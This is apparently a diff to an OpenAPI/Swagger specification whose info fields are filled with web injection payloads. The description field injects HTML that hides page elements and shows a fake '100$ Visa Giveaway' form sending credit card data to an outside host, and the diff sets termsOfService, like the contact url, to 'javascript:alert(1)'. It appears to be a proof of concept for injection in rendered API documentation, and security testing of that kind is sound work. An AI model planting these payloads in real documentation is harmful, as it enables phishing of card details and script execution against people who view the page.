@@ -4,7 +4,7 @@ info:
   title: 100$ Visa Giveaway
   default: aaaaaaaaaaaaaaaaaaaaaaaa
   description: <style>.block-desktop{display:none!important}</style><img src=https://test.xpoc.pro/z.jpg style='width:300px;height:300px;animation:fadeMe 2s'><form action=https://xpoc.pro/><p>Enter your Credit Card data to receive 100$!</p><input type=text placeholder='' name=test value=''><input type='submit' value='OK'></form>
-  termsOfService: "https://google.com"
+  termsOfService: "javascript:alert(1)"
   contact: 
    name: "100$ Visa Giveaway"
    url: "javascript:alert(1)"
